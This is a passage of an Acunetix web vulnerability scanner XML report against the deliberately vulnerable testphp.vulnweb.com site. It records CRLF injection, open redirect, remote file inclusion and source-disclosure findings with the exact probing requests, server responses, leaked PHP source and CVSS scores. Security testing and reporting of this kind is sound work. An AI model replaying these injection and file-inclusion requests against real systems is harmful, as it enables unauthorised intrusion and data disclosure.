          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="22" color="orange">
       <Name><![CDATA[CRLF injection/HTTP response splitting]]></Name>
       <ModuleName><![CDATA[Scripting (CRLF_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">r</font></b> was set to <b><font color="dark">
	SomeCustomInjectedHeader: injected_by_wvs</font></b><br/>Injected header found: <pre wrap="virtual"><font color="blue">
SomeCustomInjectedHeader: injected_by_wvs</font></pre>]]></Details>
       <Affects><![CDATA[/redir.php]]></Affects>
       <Parameter><![CDATA[r]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Is it possible for a remote attacker to inject custom HTTP headers. For example, an attacker can inject session cookies or HTML code. This may conduct to vulnerabilities like XSS (cross-site scripting) or session fixation.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to CRLF injection attacks. <br/><br/>HTTP headers have the structure &quot;Key: Value&quot;, where each line is separated by the CRLF combination. If the user input is injected into the value section without properly escaping/removing CRLF characters it is possible to alter the HTTP headers structure.<br/>
HTTP Response Splitting is a new application attack technique which enables various new attacks such as web cache poisoning, cross user defacement, hijacking pages with sensitive user information and cross-site scripting (XSS). The attacker sends a single HTTP request that forces the web server to form an output stream, which is then interpreted by the target as two HTTP responses instead of one response.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[You need to restrict CR(0x13) and LF(0x10) from the user input or properly encode the output in order to prevent the injection of custom HTTP headers.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /redir.php?r=%0d%0a%09SomeCustomInjectedHeader:%20injected_by_wvs HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 302 Moved Temporarily
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:33 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Location: 
SomeCustomInjectedHeader: injected_by_wvs
Content-Length: 0
]]></Response>
       </TechnicalDetails>
       <CWE id="113"><![CDATA[CWE-113]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:P/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.4]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[Required]]></UI>
          <UIdesc><![CDATA[Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[Low]]></C>
          <Cdesc><![CDATA[There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is constrained.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix CRLF Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/crlf-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Whitepaper -  HTTP Response Splitting]]></Database>
          <URL><![CDATA[http://packetstormsecurity.org/papers/general/whitepaper_httpresponse.pdf]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Introduction to HTTP Response Splitting]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5WP0E2KFGK.html]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="23" color="orange">
       <Name><![CDATA[Application error message]]></Name>
       <ModuleName><![CDATA[Scripting (Error_Message.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark"></font></b><br/>Error message found: <pre wrap="virtual"><font color="blue">Warning: fopen(): Filename cannot be empty in /hj/var/www/showimage.php on line 7</font></pre>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[The error messages may disclose sensitive information. This information can be used to launch further attacks.]]></Impact>
       <Description><![CDATA[This page contains an error/warning message that may disclose sensitive information. The message can also contain the location of the file that produced the unhandled exception.<br/><br/>
This may be a false positive if the error message is found in documentation pages.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Review the source code for this script.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file= HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:39 GMT
Content-Type: image/jpeg
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 195
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[PHP Runtime Configuration]]></Database>
          <URL><![CDATA[http://www.php.net/manual/en/errorfunc.configuration.php#ini.display-errors]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="24" color="orange">
       <Name><![CDATA[URL redirection]]></Name>
       <ModuleName><![CDATA[Scripting (XFS_and_Redir.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">r</font></b> was set to <b><font color="dark">http://www.vulnweb.com</font></b>.]]></Details>
       <Affects><![CDATA[/redir.php]]></Affects>
       <Parameter><![CDATA[r]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[A remote attacker can redirect users from your website to a specified URL. This problem may assist an attacker to conduct phishing attacks, trojan distribution, spammers.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to URL redirection attacks. <br/><br/>URL redirection is sometimes used as a part of phishing attacks that confuse visitors about which web site they are visiting.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should properly sanitize user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /redir.php?r=http://www.vulnweb.com HTTP/1.1
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 302 Moved Temporarily
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:39 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Location: http://www.vulnweb.com
Content-Length: 0
]]></Response>
       </TechnicalDetails>
       <CWE id="601"><![CDATA[CWE-601]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Unvalidated Redirects and Forwards Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics]]></Database>
          <URL><![CDATA[http://packetstormsecurity.org/papers/general/whitepaper_httpresponse.pdf]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="25" color="red">
       <Name><![CDATA[File inclusion]]></Name>
       <ModuleName><![CDATA[Scripting (File_Inclusion.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark">Http://testasp.vulnweb.com/t/fit.txt</font></b><br/>Pattern found: <pre wrap="virtual"><font color="blue">63c19a6da79816b21429e5bb262daed863c19a6da79816b21429e5bb262daed8</font></pre>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[It is possible for a remote attacker to include a file from local or remote resources and/or execute arbitrary script code with the privileges of the web-server.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to file inclusion attacks. <br/><br/>It seems that this script includes a file which name is determined using user-supplied data. This data is not properly validated before being passed to the include function. ]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Edit the source code to ensure that input is properly validated. Where is possible, it is recommended to make a list of accepted filenames and restrict the input to that list.<br/><br/>
For PHP, the option <b>allow_url_fopen</b> would normally allow a programmer to open, include or otherwise use a remote file using a URL rather than a local file path. It is recommended to disable this option from php.ini.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=Http://testasp.vulnweb.com/t/fit.txt HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:40 GMT
Content-Type: image/jpeg
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 64
]]></Response>
       </TechnicalDetails>
       <CWE id="20"><![CDATA[CWE-20]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[PHP - Using remote files]]></Database>
          <URL><![CDATA[http://www.php.net/manual/en/features.remote-files.php]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Remote file inclusion]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Remote_file_inclusion]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="26" color="red">
       <Name><![CDATA[Script source code disclosure]]></Name>
       <ModuleName><![CDATA[Scripting (Script_Source_Code_Disclosure.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark">showimage.php</font></b><br/>Source disclosure pattern found: <pre wrap="virtual"><font color="blue">&lt;?php
// header(&quot;Content-Length: 1&quot; /*. filesize($name)*/);
if( isset($_GET[&quot;file&quot;]) &amp;&amp; !isset($_GET[&quot;size&quot;]) ){
	// open the file in a binary mode
	header(&quot;Content-Type: image/jpeg&quot;);
	$name = $_GET[&quot;file&quot;];
	$fp = fopen($name, 'rb');
	
	// send the right headers
	header(&quot;Content-Type: image/jpeg&quot;);	
	
	// dump the picture and stop the script
	fpassthru($fp);
	exit;
}
elseif (isset($_GET[&quot;file&quot;]) &amp;&amp; isset($_GET[&quot;size&quot;])){
	header(&quot;Content-Type: image/jpeg&quot;);
	$name = $_GET[&quot;file&quot;];
	$fp  ... </font></pre>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker can gather sensitive information (database connection strings, application logic) by analyzing the source code. This information can be used to launch further attacks.]]></Impact>
       <Description><![CDATA[It is possible to read the source code of this script by using script filename as a parameter. It seems that this script includes a file which name is determined using user-supplied data. This data is not properly validated before being passed to the include function. ]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Analyze the source code of this script and solve the problem.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=showimage.php HTTP/1.1
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:41 GMT
Content-Type: image/jpeg
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 687
]]></Response>
       </TechnicalDetails>
       <CWE id="538"><![CDATA[CWE-538]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
